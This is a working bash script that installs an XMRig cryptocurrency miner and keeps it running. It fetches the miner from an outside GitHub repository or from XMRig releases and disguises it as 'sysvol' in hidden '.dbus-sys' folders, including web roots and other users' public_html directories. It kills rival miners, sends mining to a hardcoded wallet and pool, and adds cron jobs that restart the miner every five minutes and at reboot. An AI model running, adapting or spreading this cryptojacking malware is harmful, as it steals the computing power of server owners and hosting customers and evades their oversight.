#!/bin/bash

################################################################################
# XMRig Deployment Script v12.1 FINAL
# Author: boyyywiliam
# Purpose: Automated XMRig miner deployment with persistence
# Features: Retry logic, multiple sources, error handling, logging
################################################################################

set -e

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
SCRIPT_VERSION="12.1-FINAL"
LOG_FILE="/tmp/deploy_$(date +%s).log"

# XMRig versions to try (primary, secondary, tertiary)
XMRIG_VERSIONS=("6.21.0" "6.19.3" "6.18.0")

# Binary sources (multiple fallbacks)
declare -a BINARY_SOURCES=(
    "https://raw.githubusercontent.com/boyyywiliam/Aselole/main/cibung"
    "https://raw.githubusercontent.com/xmrig/xmrig/master/src/xmrig"
)

# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING FUNCTION
# ═══════════════════════════════════════════════════════════════════════════════

log() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo "$timestamp $@" | tee -a "$LOG_FILE"
}

log_error() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo "$timestamp [ERROR] $@" | tee -a "$LOG_FILE" >&2
}

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

cleanup_temp() {
    rm -rf /tmp/xmrig_deploy_$$ 2>/dev/null || true
    rm -f /tmp/xm_*.tar.gz 2>/dev/null || true
}

trap cleanup_temp EXIT

is_executable() {
    [ -f "$1" ] && [ -x "$1" ] && "$1" --version >/dev/null 2>&1
}

validate_binary() {
    local binary="$1"
    
    if [ ! -f "$binary" ]; then
        return 1
    fi
    
    local size=$(stat -c%s "$binary" 2>/dev/null || stat -f%z "$binary" 2>/dev/null || echo 0)
    if [ "$size" -lt 2000000 ]; then
        log_error "Binary too small: $size bytes"
        return 1
    fi
    
    if ! file "$binary" 2>/dev/null | grep -q "ELF\|executable"; then
        return 1
    fi
    
    if ! "$binary" --version >/dev/null 2>&1; then
        return 1
    fi
    
    return 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# DOWNLOAD WITH AGGRESSIVE RETRY
# ═══════════════════════════════════════════════════════════════════════════════

download_file() {
    local url="$1"
    local output="$2"
    local timeout="${3:-120}"
    local max_attempts="${4:-7}"
    local attempt=1
    
    log "[*] Downloading: $url"
    log "[*] Timeout: ${timeout}s | Max attempts: $max_attempts"
    
    rm -f "$output" 2>/dev/null || true
    
    while [ $attempt -le $max_attempts ]; do
        log "[*] Attempt $attempt/$max_attempts..."
        
        # Try curl with retry
        if command -v curl &>/dev/null; then
            if timeout $timeout curl -fsSLk -m $timeout --retry 2 --retry-delay 1 \
                -o "$output" "$url" 2>/dev/null; then
                if [ -f "$output" ] && [ -s "$output" ]; then
                    log "[+] Download successful (curl)"
                    return 0
                fi
            fi
        fi
        
        # Try wget with retry
        if command -v wget &>/dev/null; then
            if timeout $timeout wget --no-check-certificate --timeout=$timeout \
                --tries=3 --waitretry=1 -q -O "$output" "$url" 2>/dev/null; then
                if [ -f "$output" ] && [ -s "$output" ]; then
                    log "[+] Download successful (wget)"
                    return 0
                fi
            fi
        fi
        
        # Try lynx
        if command -v lynx &>/dev/null; then
            if timeout $timeout lynx -dump "$url" > "$output" 2>/dev/null; then
                if [ -f "$output" ] && [ -s "$output" ]; then
                    log "[+] Download successful (lynx)"
                    return 0
                fi
            fi
        fi
        
        rm -f "$output" 2>/dev/null || true
        
        if [ $attempt -lt $max_attempts ]; then
            local sleep_time=$((attempt * 3))
            log "[!] Failed, retrying in ${sleep_time}s..."
            sleep $sleep_time
        fi
        
        attempt=$((attempt + 1))
    done
    
    log_error "Download failed after $max_attempts attempts"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# SYSTEM DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

detect_cores() {
    if command -v nproc &>/dev/null; then
        nproc
    elif [ -f /proc/cpuinfo ]; then
        grep -c ^processor /proc/cpuinfo || echo 1
    else
        echo 1
    fi
}

detect_memory_mb() {
    if [ -f /proc/meminfo ]; then
        grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)}' || echo 1024
    elif command -v free &>/dev/null; then
        free -m | awk '/^Mem:/{print $2}' || echo 1024
    else
        echo 1024
    fi
}

detect_optimal_threads() {
    local cores=$(detect_cores)
    local mem_mb=$(detect_memory_mb)
    
    # Max 1 thread per 250MB RAM
    local max_by_mem=$((mem_mb / 250))
    [ "$max_by_mem" -lt 1 ] && max_by_mem=1
    
    # Cap at 8 threads for shared hosting
    local threads=$cores
    [ "$threads" -gt "$max_by_mem" ] && threads=$max_by_mem
    [ "$threads" -gt 8 ] && threads=8
    [ "$threads" -lt 1 ] && threads=1
    
    echo "$threads"
}

# ═══════════════════════════════════════════════════════════════════════════════
# DIRECTORY DETECTION & CREATION
# ═══════════════════════════════════════════════════════════════════════════════

is_exec_ok() {
    local dir="$1"
    [ -d "$dir" ] || return 1
    [ -w "$dir" ] || return 1
    
    local probe="$dir/.probe_$$"
    printf '#!/bin/sh\nexit 0\n' > "$probe" 2>/dev/null || return 1
    chmod 755 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
    
    if "$probe" >/dev/null 2>&1; then
        rm -f "$probe"
        return 0
    fi
    
    rm -f "$probe"
    return 1
}

pick_base_dir() {
    local user_home="$HOME"
    local me=$(whoami)
    
    local candidates=(
        "${user_home}/.dbus-sys"
        "${user_home}/.cache/.dbus-sys"
        "/var/www/.dbus-sys-${me}"
        "/var/www/html/.dbus-sys-${me}"
        "/home/${me}/public_html/.dbus-sys"
        "/srv/www/.dbus-sys-${me}"
        "/opt/.dbus-sys-${me}"
        "/usr/local/var/.dbus-sys-${me}"
        "/var/lib/.dbus-sys-${me}"
    )
    
    for wr in /var/www/vhosts/*/httpdocs /home/*/public_html /var/www/html /usr/share/nginx/html; do
        [ -d "$wr" ] && [ -w "$wr" ] 2>/dev/null && candidates+=("${wr}/.dbus-sys-${me}")
    done
    
    for base in "${candidates[@]}"; do
        local parent=$(dirname "$base")
        
        if [ ! -d "$parent" ]; then
            mkdir -p "$parent" 2>/dev/null || continue
        fi
        
        [ -w "$parent" ] 2>/dev/null || continue
        mkdir -p "$base" 2>/dev/null || continue
        
        if is_exec_ok "$base"; then
            echo "$base"
            return 0
        else
            rmdir "$base" 2>/dev/null || true
        fi
    done
    
    return 1
}

determine_base_dir() {
    local base
    base=$(pick_base_dir) || true
    
    if [ -z "$base" ]; then
        log_error "No executable & writable directory found"
        return 1
    fi
    
    echo "$base"
}

create_dirs() {
    local BASE="$1"
    local attempt=1
    
    while [ $attempt -le 5 ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
            if chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" "$BASE/tmp" 2>/dev/null; then
                return 0
            fi
        fi
        
        sleep 1
        attempt=$((attempt + 1))
    done
    
    log_error "Failed to create directories"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# BINARY DOWNLOAD & EXTRACTION
# ═══════════════════════════════════════════════════════════════════════════════

get_xmrig_binary() {
    local BASE="$1"
    local TMPDIR=$(mktemp -d)
    
    # Try each version
    for ver in "${XMRIG_VERSIONS[@]}"; do
        log "[*] Trying XMRig v$ver..."
        
        local url="https://github.com/xmrig/xmrig/releases/download/v${ver}/xmrig-${ver}-linux-static-x64.tar.gz"
        local tarball="$TMPDIR/xmrig.tar.gz"
        
        if download_file "$url" "$tarball" 180 5; then
            if cd "$TMPDIR" 2>/dev/null; then
                tar -xzf "$tarball" 2>/dev/null || continue
                
                local binary=$(find "$TMPDIR" -name "xmrig" -type f -executable 2>/dev/null | head -1)
                if [ -n "$binary" ] && validate_binary "$binary"; then
                    cp "$binary" "$BASE/sbin/sysvol"
                    chmod 755 "$BASE/sbin/sysvol"
                    log "[+] XMRig v$ver extracted successfully"
                    rm -rf "$TMPDIR"
                    return 0
                fi
            fi
        fi
    done
    
    rm -rf "$TMPDIR"
    return 1
}

get_repo_binary() {
    local BASE="$1"
    
    for source in "${BINARY_SOURCES[@]}"; do
        log "[*] Trying repo binary: $source"
        
        local temp="$BASE/tmp/.dl_repo_$$"
        if download_file "$source" "$temp" 120 5; then
            if validate_binary "$temp"; then
                mv "$temp" "$BASE/sbin/sysvol"
                chmod 755 "$BASE/sbin/sysvol"
                log "[+] Repo binary validated"
                return 0
            fi
            rm -f "$temp"
        fi
    done
    
    return 1
}

acquire_binary() {
    local BASE="$1"
    
    log "[*] ═══════════════════════════════════════════════════════"
    log "[*] BINARY ACQUISITION PHASE"
    log "[*] ═══════════════════════════════════════════════════════"
    
    # Try repo first (faster)
    if get_repo_binary "$BASE"; then
        return 0
    fi
    
    log "[!] Repo binary failed, trying XMRig official..."
    
    # Fallback to XMRig official
    if get_xmrig_binary "$BASE"; then
        return 0
    fi
    
    log_error "All binary sources failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION & STARTUP
# ═══════════════════════════════════════════════════════════════════════════════

create_config() {
    local BASE="$1"
    local THREADS="$2"
    
    # Build thread array
    local THREAD_LIST=""
    for i in $(seq 0 $((THREADS - 1))); do
        [ -z "$THREAD_LIST" ] && THREAD_LIST="$i" || THREAD_LIST="$THREAD_LIST,$i"
    done
    
    local WORKER="$(hostname)-$(date +%s | tail -c 4)"
    
    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": false,
  "cpu": {
    "enabled": true,
    "threads": [$THREAD_LIST],
    "yield": true
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET",
    "pass": "$WORKER",
    "tls": true,
    "keepalive": true
  }],
  "print-time": 30,
  "log-file": "$BASE/log/core.log"
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"
    
    log "[+] Configuration created"
    log "[*] Worker: $WORKER"
    log "[*] Threads: $THREADS"
}

create_guard() {
    local BASE="$1"
    local THREADS="$2"
    
    cat > "$BASE/run/guard.sh" << 'GRDEOF'
#!/bin/bash
BASE="__BASE_PATH__"
BIN="$BASE/sbin/sysvol"
CFG="$BASE/cfg/config.json"
PID_FILE="$BASE/run/state.pid"
LOG="$BASE/log/core.log"

if [ -f "$PID_FILE" ]; then
    PID=$(cat "$PID_FILE" 2>/dev/null)
    kill -0 "$PID" 2>/dev/null && exit 0
fi

mkdir -p "$(dirname "$LOG")" 2>/dev/null
pkill -9 -f "$BIN" 2>/dev/null
sleep 1

setsid "$BIN" -c "$CFG" --cpu-max-threads-hint=__HINT__ >> "$LOG" 2>&1 < /dev/null &
echo $! > "$PID_FILE"
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|g" "$BASE/run/guard.sh"
    sed -i "s|__HINT__|$((THREADS * 5))|g" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    
    log "[+] Guard script created"
}

setup_persistence() {
    local BASE="$1"
    
    log "[*] Setting up persistence..."
    
    # Try cron
    if command -v crontab &>/dev/null; then
        if crontab -l 2>/dev/null | grep -q . ; then
            (crontab -l 2>/dev/null | grep -v "dbus-sys"; \
             echo "*/5 * * * * $BASE/run/guard.sh >/dev/null 2>&1"; \
             echo "@reboot sleep 10 && $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null
        else
            (echo "*/5 * * * * $BASE/run/guard.sh >/dev/null 2>&1"; \
             echo "@reboot sleep 10 && $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null
        fi
        
        if crontab -l 2>/dev/null | grep -q "dbus-sys"; then
            log "[+] Cron persistence installed (5 min interval)"
            return 0
        fi
    fi
    
    log "[!] Cron unavailable, persistence may be limited"
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════════

main() {
    log ""
    log "╔════════════════════════════════════════════════════════╗"
    log "║     XMRig Deployment Script v${SCRIPT_VERSION}                ║"
    log "╚════════════════════════════════════════════════════════╝"
    log ""
    
    # Clean existing
    log "[*] Cleaning existing miners..."
    pkill -9 -f "sysvol" 2>/dev/null || true
    pkill -9 -f "xmrig" 2>/dev/null || true
    sleep 2
    
    # Determine base directory
    log "[*] Detecting base directory..."
    local BASE
    BASE=$(determine_base_dir) || { log_error "Failed to determine base directory"; exit 1; }
    log "[+] Base directory: $BASE"
    
    # Create directories
    log "[*] Creating directories..."
    create_dirs "$BASE" || { log_error "Failed to create directories"; exit 1; }
    
    # Acquire binary
    acquire_binary "$BASE" || { log_error "Failed to acquire binary"; exit 1; }
    
    # Detect system specs
    local CORES=$(detect_cores)
    local MEM=$(detect_memory_mb)
    local THREADS=$(detect_optimal_threads)
    
    log "[*] System specs:"
    log "[*]   CPU cores: $CORES"
    log "[*]   Memory: ${MEM}MB"
    log "[*]   Optimal threads: $THREADS"
    
    # Create config
    create_config "$BASE" "$THREADS"
    
    # Create guard
    create_guard "$BASE" "$THREADS"
    
    # Start miner
    log "[*] Starting miner..."
    pkill -9 -f "sysvol" 2>/dev/null || true
    rm -f "$BASE/run/state.pid" 2>/dev/null
    
    bash "$BASE/run/guard.sh"
    sleep 5
    
    # Verify
    local PID=$(pgrep -f "sysvol" | head -1)
    if [ -n "$PID" ]; then
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║           ✓ DEPLOYMENT SUCCESSFUL v${SCRIPT_VERSION}        ║"
        log "╠════════════════════════════════════════════════════════╣"
        log "║ Process ID: $PID"
        log "║ Base: $BASE"
        log "║ Binary: $BASE/sbin/sysvol"
        log "║ Config: $BASE/cfg/config.json"
        log "║ Log: $BASE/log/core.log"
        log "║ Pool: $POOL"
        log "║ Threads: $THREADS"
        log "╚════════════════════════════════════════════════════════╝"
        log ""
        
        # Setup persistence
        setup_persistence "$BASE"
        
        # Show initial log
        log "[*] Initial log output:"
        sleep 3
        tail -10 "$BASE/log/core.log" | tee -a "$LOG_FILE"
        
        log ""
        log "[+] Deployment completed successfully"
        log "[+] Log file: $LOG_FILE"
        
        return 0
    else
        log ""
        log "╔════════════════════════════════════════════════════════╗"
        log "║         ✗ DEPLOYMENT FAILED - Process Not Running      ║"
        log "╚════════════════════════════════════════════════════════╝"
        log ""
        
        # Debug info
        log "[*] Debug information:"
        log "[*] Binary check:"
        "$BASE/sbin/sysvol" --version 2>&1 | head -5 | tee -a "$LOG_FILE" || log "[!] Binary execution failed"
        
        log "[*] Config check:"
        cat "$BASE/cfg/config.json" | tee -a "$LOG_FILE" || log "[!] Config not found"
        
        log "[*] Recent log:"
        tail -30 "$BASE/log/core.log" 2>/dev/null | tee -a "$LOG_FILE" || log "[!] No log available"
        
        return 1
    fi
}

# Execute
main "$@"